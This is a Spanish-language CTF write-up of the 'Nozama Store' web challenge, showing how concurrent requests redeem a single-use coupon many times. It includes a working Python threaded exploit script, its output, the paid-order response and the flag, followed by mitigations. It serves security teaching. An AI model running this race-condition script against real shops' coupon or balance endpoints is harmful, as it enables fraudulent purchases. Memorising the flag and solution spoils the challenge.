---
tipo: laboratorio
Plataforma: Pentraze CTF
Ronda: 2
Fuente: '[[assets/PentraZE-2026-ronda-2/ctf.docx]]'
actualizado: 2026-10-18
tags: [ctf, pentraze, ronda-2, web, medium, race-condition, python]
Categoría: Web
Estado: Completado
Dificultad: Medium
Puntos: '100'
Flag: PENTRAZE{93c7ef9152ae9566480f459eeeacec61241f5828e334a5e59082e332e0e858fa}
Estado_flag: Documentada en la fuente
---

- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Medium|Medium]]
- **Puntos:** 100
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Ronda:** [[PentraZE CTF 2026 - Ronda 2|Segunda ronda]]
- **Estado:** Completado

# Writeup - Nozama Store

> [!info] Objetivo
> Comprar la Entrada Final — Sala Dorada de US$1,000 aprovechando canjes concurrentes de un cupón de uso único.

## Resumen rápido de la cadena de ataque

1. El frontend reveló los endpoints y el cupón `ROOTKITTY10`.
2. El primer canje añadió US$50; los siguientes secuenciales devolvieron `409 already_used`.
3. Una prueba de 25 solicitudes concurrentes consiguió 22 canjes y US$1,100.
4. Se registró una cuenta válida y se compartió su cookie `PHPSESSID` entre solicitudes.
5. La explotación final aceptó 30 canjes, acumuló US$1,500 y pagó el producto.
6. El checkout devolvió la flag; quedaron US$500 de saldo.

## Vulnerabilidades y hallazgos

- [[Race Condition]] en el consumo del cupón: el control secuencial no garantizaba atomicidad.
- Fallo de lógica de negocio en la actualización del saldo y del estado de canje.
- [[1- Introducción a la Programación Concurrente|Concurrencia en Python]] con `ThreadPoolExecutor`; la cookie de sesión [[Authentication|identificaba al mismo usuario]] en cada petición.

## Contexto documentado

- **Autor:** je7remy
- **Competencia:** Pentraze CTF 2026
- **Categoría:** Web
- **Dificultad:** Medium
- **Puntuación:** 100 puntos
- **Vulnerabilidad:** Race Condition / Business Logic Flaw
- **Estado:** Resuelto

## Paso a paso técnico

### 1. Descripción del reto

Nozama Store

¿Cuántos CuPoNeS puedes usar???

El desafío presenta una tienda virtual que permite registrar usuarios, añadir productos al carrito y canjear códigos promocionales.

Entre los productos disponibles se encuentra Entrada Final — Sala Dorada, identificada como flag-ticket, con un precio de US$1,000.

El objetivo consiste en adquirir ese producto para obtener la flag.

### 2. Reconocimiento

Se comenzó inspeccionando el código JavaScript incluido en la página principal y consultando el estado de la aplicación.

Durante el análisis se identificaron los siguientes endpoints:

| Endpoint | Función |
| --- | --- |
| /api/signup | Registrar una cuenta |
| /api/signin | Iniciar sesión |
| /api/me | Consultar el usuario autenticado |
| /api/state | Consultar carrito y saldo |
| /api/apply-coupon | Canjear un cupón |
| /api/add | Añadir productos al carrito |
| /api/checkout | Procesar la compra |

También se descubrió una referencia al código promocional ROOTKITTY10 dentro del HTML.

La consulta a /api/state reveló el producto objetivo:

```json
{
  "flag-ticket": {
    "name": "Entrada Final — Sala Dorada",
    "price": 1000
  }
}
```

### 3. Análisis del sistema de cupones

Se identificó que el endpoint /api/apply-coupon recibe solicitudes POST con el siguiente formato:

```json
{
  "code": "ROOTKITTY10"
}
```

El primer canje respondió:

```json
{
  "ok": true,
  "balance": 50,
  "coupon_used": true
}
```

Cada canje válido proporciona US$50 de saldo.

Sin embargo, al intentar utilizar nuevamente el mismo cupón de forma secuencial, el servidor respondió:

```http
HTTP/1.1 409 Conflict
{
  "error": "already_used",
  "balance": 50
}
```

Esto demostraba que el sistema disponía de un control para impedir la reutilización del cupón.

### 4. Identificación de la vulnerabilidad

Se planteó la hipótesis de una condición de carrera (Race Condition).

Una condición de carrera ocurre cuando varias operaciones concurrentes acceden o modifican un mismo estado y el resultado depende del orden en el que se ejecutan.

En este caso, el comportamiento observado es compatible con que varias solicitudes puedan superar la comprobación de uso del cupón antes de que el servidor registre de forma efectiva su consumo.

El flujo vulnerable sería equivalente a:

```text
Solicitud A ──┐
Solicitud B ──┤
Solicitud C ──┼──► Comprobar cupón disponible
Solicitud D ──┤              │
Solicitud E ──┘              ▼
                       Aplicar crédito
                             │
                             ▼
                     Actualizar estado
```

El código interno del backend no estaba disponible, por lo que esta explicación representa el mecanismo probable a partir de los resultados, no una verificación directa de su implementación.

### 5. Prueba de explotación

Se realizaron 25 solicitudes concurrentes utilizando ThreadPoolExecutor de Python y compartiendo la cookie PHPSESSID.

El resultado inicial fue:

```text
Saldo: 1100
Canjes: 22
```

Se consiguieron 22 canjes exitosos, equivalentes a US$1,100, aun cuando las solicitudes secuenciales posteriores al primer canje devolvían 409.

La condición de carrera quedó demostrada.

### 6. Explotación completa

Para comprar el producto era necesario registrar una cuenta.

Durante las pruebas se descubrieron dos requisitos de validación:

- El nombre de usuario debía contener entre 3 y 20 caracteres alfanuméricos.

- La contraseña debía contener al menos 8 caracteres alfanuméricos.

Una vez corregidos estos valores, se creó una sesión autenticada y se ejecutó la explotación.

#### Script utilizado

```python
import requests
import uuid
from concurrent.futures import ThreadPoolExecutor

BASE = "http://34.135.253.132:35501"
CUPON = "ROOTKITTY10"
PRECIO = 1000

s = requests.Session()

def post(ruta, datos=None):
    if datos is None:
        return s.post(BASE + ruta, timeout=15)
    return s.post(BASE + ruta, json=datos, timeout=15)

# Inicializar sesión
s.get(BASE + "/api/state", timeout=10)

# Registrar usuario
usuario = "kitty" + uuid.uuid4().hex[:8]
password = "KittyCTF2026"
email = usuario + "@example.com"

r = post("/api/signup", {
    "user": usuario,
    "pass": password,
    "email": email,
    "name": usuario,
    "uni": "CTF"
})

print("REGISTRO:", r.status_code, r.text)

if r.status_code not in (200, 201):
    raise SystemExit("Registro rechazado")

# Confirmar autenticación
me = s.get(BASE + "/api/me", timeout=10).json()

if not me.get("user"):
    login = post("/api/signin", {
        "user": usuario,
        "pass": password
    })
    me = s.get(BASE + "/api/me", timeout=10).json()

if not me.get("user"):
    raise SystemExit("Sin sesión autenticada")

# Compartir la sesión PHP
cookies = s.cookies.get_dict()

def canjear(i):
    try:
        r = requests.post(
            BASE + "/api/apply-coupon",
            json={"code": CUPON},
            cookies=cookies,
            timeout=15
        )
        return r.status_code
    except requests.RequestException:
        return 0

# Ejecutar 30 solicitudes simultáneas
with ThreadPoolExecutor(max_workers=30) as pool:
    resultados = list(pool.map(canjear, range(30)))

print("Canjes exitosos:", resultados.count(200))

# Verificar saldo
estado = s.get(BASE + "/api/state", timeout=10).json()
saldo = estado.get("balance", 0)

print("SALDO:", saldo)

if saldo < PRECIO:
    raise SystemExit("Saldo insuficiente")

# Añadir el producto protegido
r = post("/api/add", {
    "item": "flag-ticket",
    "qty": 1
})

print("CARRITO:", r.status_code, r.text)

if not r.ok:
    raise SystemExit("No se pudo agregar el producto")

# Realizar compra
r = post("/api/checkout")

print("CHECKOUT:", r.status_code, r.text)

resultado = r.json()
flag = resultado.get("order", {}).get("flag")

if flag:
    print("FLAG:", flag)
```

### 7. Resultados obtenidos

La explotación final se ejecutó correctamente con una cuenta autenticada.

```text
=== REGISTRO ===
HTTP: 200
USUARIO AUTENTICADO: kitty752406ad
Cookie de sesión: OK

=== RACE CONDITION ===
Canjes HTTP 200: 30
SALDO: 1500
CREDITOS: 30
CUPON UTILIZADO: True

=== AGREGAR FLAG AL CARRITO ===
HTTP: 200

=== CHECKOUT ===
HTTP: 200
```

Los 30 canjes fueron aceptados, acumulando US$1,500.

La respuesta del checkout confirmó una orden pagada:

```json
{
  "order": {
    "id": "ord_c59fc298727a",
    "total": 1000,
    "items": {
      "flag-ticket": 1
    },
    "status": "paid",
    "summary": {
      "subtotal": 1000,
      "discount": 1000,
      "total": 0,
      "credits_used": 20
    }
  },
  "balance": 500
}
```

La respuesta también incluía el campo order.flag, que contenía la flag del desafío.

### 8. Flag obtenida

```text
PENTRAZE{93c7ef9152ae9566480f459eeeacec61241f5828e334a5e59082e332e0e858fa}
```

Resultado: desafío completado — 100 puntos.

### 9. Impacto y mitigación

La vulnerabilidad permite que un usuario acumule crédito promocional por encima del límite previsto, comprometiendo la lógica económica de la aplicación.

En un comercio electrónico real, una debilidad semejante podría permitir compras sin abonar el importe correspondiente.

Para prevenirla, se recomienda:

- Aplicar el cupón y actualizar su estado mediante una operación atómica.

- Utilizar transacciones de base de datos con mecanismos adecuados de bloqueo o concurrencia.

- Implementar restricciones de unicidad sobre los canjes aplicables a cada usuario o sesión.

- Calcular y verificar el saldo exclusivamente en el backend.

- Incorporar pruebas automatizadas con solicitudes concurrentes.

### 10. Conclusión

El desafío Nozama Store demostró cómo un control de negocio aparentemente correcto puede fallar cuando varias solicitudes se procesan simultáneamente.

Aunque el servidor impedía reutilizar secuencialmente el cupón ROOTKITTY10, fue posible canjearlo repetidamente mediante solicitudes concurrentes, acumular US$1,500 y comprar la Entrada Final de US$1,000.

La técnica principal fue Race Condition, aprovechando una debilidad en la gestión concurrente del estado de los cupones.

PENTRAZE CTF 2026 | Nozama Store | Solved by je7remy


## Flag

```text
PENTRAZE{93c7ef9152ae9566480f459eeeacec61241f5828e334a5e59082e332e0e858fa}
```

## Lecciones aprendidas y mitigar

- Probar secuencialmente un límite no demuestra que se mantenga bajo concurrencia.
- La explotación confirmó canjes múltiples; no se dispone del backend para afirmar una secuencia interna exacta ni el mecanismo de bloqueo PHP.
- La operación de comprobar, consumir y acreditar debe ser atómica, con restricciones de unicidad y control de concurrencia adecuados.
- Validar saldo, identidad y compra en el servidor. El resultado económico se comprueba con el estado y la orden, no solo contando respuestas HTTP 200.

## Evidencia y revisión documental

El script de Nozama conserva sus 100 párrafos de código y líneas vacías del Word. La salida final se conserva como registro aportado: sus rótulos no coinciden exactamente con todos los `print` del script, por lo que no se atribuye a una reejecución ni se modifica para aparentar esa correspondencia.

Fuente conservada: [[assets/PentraZE-2026-ronda-2/ctf.docx|ctf.docx original]]. Las descripciones, pruebas, payloads y salidas anteriores proceden de ese documento; no se han reejecutado. Las relaciones y mitigaciones adicionales son síntesis editorial. El Word no contiene imágenes incrustadas.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🏠 MOC: [[PentraZE CTF 2026 - MOC]]
- 🗂️ Ronda: [[PentraZE CTF 2026 - Ronda 2]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - Lives 9, Backups 0]]
- ➡️ Siguiente: [[Writeup - SMBiablo]]

## Relacionadas

- [[Writeup - HooKitty]] — comparar con TOCTOU: ambas pruebas separan comprobación y uso; Nozama disputa el saldo compartido y HooKitty cambia la resolución DNS.
- [[Writeup - Factura Fantasma]] — reutilizar sesiones y parsing JSON con Python; allí las solicitudes enumeran datos y aquí introducen concurrencia deliberada.
- [[MOC - Python para Ciberseguridad]] — `requests`, manejo de cookies y pools de hilos aplicados al estado de negocio.
- [[1- Protocolo HTTP]] — interpretar `200`, `409`, métodos y cuerpo JSON.
- [[Writeup - La Receta]] — dos formas de alterar un estado de autorización/negocio en servidor: escritura SQL frente a transición no atómica.
